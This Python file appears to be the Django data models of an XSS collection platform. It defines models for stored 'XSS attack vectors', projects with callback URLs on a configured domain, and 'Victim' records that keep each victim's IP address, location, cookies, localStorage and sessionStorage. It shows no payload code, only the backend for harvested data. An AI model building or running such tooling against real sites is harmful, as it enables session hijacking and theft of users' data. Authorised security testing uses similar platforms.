import json
from django.db import models
from django.utils import timezone
from django.template.defaultfilters import date
from django.db.models import JSONField
from django.conf import settings
from hashids import Hashids
from django.http.cookie import parse_cookie


hashids = Hashids(salt='c0n0tE_1s_G00d_p1Atf0rM', min_length=4)


class Payload(models.Model):
    name = models.CharField('名称', max_length=128, null=True, blank=False)
    description = models.CharField('描述', max_length=256, null=True, blank=True)
    data = models.TextField('Payload')

    created_time = models.DateTimeField('创建时间', auto_now_add=True)
    last_modify_time = models.DateTimeField('修改时间', auto_now=True)

    def __str__(self):
        return self.name

    class Meta:
        ordering = ['-created_time']
        verbose_name = 'XSS攻击向量'
        verbose_name_plural = verbose_name


def generate_project_name():
    return date(timezone.localtime(timezone.now()), '项目（YmdHis）')


class Project(models.Model):
    name = models.CharField('名称', max_length=128, default=generate_project_name)
    payload = models.TextField('代码', blank=True)
    description = models.CharField('描述', max_length=256, null=True, blank=True, help_text='一些辅助性描述')

    user = models.ForeignKey(
        settings.AUTH_USER_MODEL,
        verbose_name='用户',
        on_delete=models.CASCADE,
        related_name='xss_projects'
    )

    created_time = models.DateTimeField('创建时间', auto_now_add=True)
    last_modify_time = models.DateTimeField('修改时间', auto_now=True)

    def __str__(self):
        return self.name

    class Meta:
        ordering = ['-created_time']
        verbose_name = '项目'
        verbose_name_plural = verbose_name

    def get_absolute_url(self):
        return 'http://{host}/{id}'.format(host=settings.O_XSS_DOMAIN, id=hashids.encode(self.pk))

    @staticmethod
    def decode_id(ids):
        return hashids.decode(ids)

    def get_tz_url(self):
        return '//{host}/{id}.png'.format(host=settings.O_XSS_DOMAIN, id=hashids.encode(self.pk))


def return_object():
    return {}


class Victim(models.Model):
    url = models.TextField('当前URL')
    log = models.OneToOneField(
        'log.WebLog',
        verbose_name='Web日志',
        null=True,
        on_delete=models.SET_NULL
    )
    data = JSONField('数据', default=return_object)
    ip_addr = models.GenericIPAddressField('IP地址')
    location = models.CharField('地区', max_length=256, blank=True, null=True)

    project = models.ForeignKey(
        'Project',
        verbose_name='主机',
        on_delete=models.CASCADE,
        related_name='victims'
    )
    is_view = models.BooleanField('查看', default=False)
    created_time = models.DateTimeField('创建时间', auto_now_add=True)
    last_modify_time = models.DateTimeField('修改时间', auto_now=True)

    def __str__(self):
        return self.url

    class Meta:
        ordering = ['-created_time']
        verbose_name = '主机'
        verbose_name_plural = verbose_name

    def cookies(self):
        try:
            return parse_cookie(self.data.get('cookie', ''))
        except:
            return {}

    def local_storage(self):
        try:
            return json.loads(self.data.get('ls', '{}'))
        except:
            return {}

    def session_storage(self):
        try:
            return json.loads(self.data.get('ss', '{}'))
        except:
            return {}
